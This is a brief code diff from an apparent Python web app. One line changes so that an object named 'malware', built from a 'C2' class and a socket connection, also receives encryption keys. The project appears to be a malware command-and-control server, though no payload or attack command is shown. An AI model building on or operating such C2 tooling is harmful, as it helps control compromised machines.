@@ -15,7 +15,7 @@ keys = encrypt_messages()
 public_key = keys.receive_public_key()
 private_key = keys.receive_private_key()
 
-malware = C2(sio)
+malware = C2(sio, keys)
 
 # Helper function to check if user is logged in
 def is_logged_in():
